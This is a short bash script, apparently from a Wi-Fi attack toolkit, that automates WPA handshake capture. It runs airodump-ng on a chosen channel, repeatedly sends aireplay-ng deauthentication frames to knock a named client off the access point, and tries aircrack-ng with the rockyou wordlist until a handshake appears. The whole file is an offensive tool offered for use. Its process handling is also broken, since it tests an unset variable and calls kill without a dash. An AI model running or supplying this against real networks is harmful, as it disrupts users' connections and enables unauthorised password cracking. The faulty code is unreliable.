#!/bin/bash

APMAC=$1
CLMAC=$2
CH=$3
PSKFILE=$4
INTERFACE=$5

echo "Attempting to capture packets on channel $CH..."

# Displays airodump-ng and captured packet info for user on channel $CH
x-terminal-emulator -e "airodump-ng -w crackfiles/${PSKFILE} -c $CH $INTERFACE" &
sleep 2

echo Attempting to get WPA handshake on $APMAC...

HSHAKE="temp"

# Checks if WPA handshake was successfully retrieved
while [ -n "$HSHAKE" ]
do
	aireplay-ng -0 5 -a $APMAC -c $CLMAC $INTERFACE
	sleep 10

	# Attempts to obtain WPA handshake by saving to output file
	aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/$PSKFILE*.cap > dumpfiles/$PSKFILE.txt &
	sleep 1

	# Obtains PID of aircrack process above and will kill it
	CRACKPID=`ps -ef | grep "\baircrack\b" | awk '{print $2}'`
	if [ -n "$TEMPPID" ]
	then
		kill 9 $CRACKPID
	fi

	# If HSHAKE is not null, then WPA handshake was not found
	HSHAKE=$(grep "No valid WPA handshakes found" dumpfiles/$PSKFILE.txt)
	if [ -n "$HSHAKE" ]
	then
		echo
		echo "$HSHAKE"
		echo
	fi

done

# Once WPA handshake has been found, airodump-ng is no longer needed
DUMPPID=`ps -ef | grep "\bairodump-ng\b" | awk '{print $2}'`
kill 15 $DUMPPID

echo WPA handshake has been found!

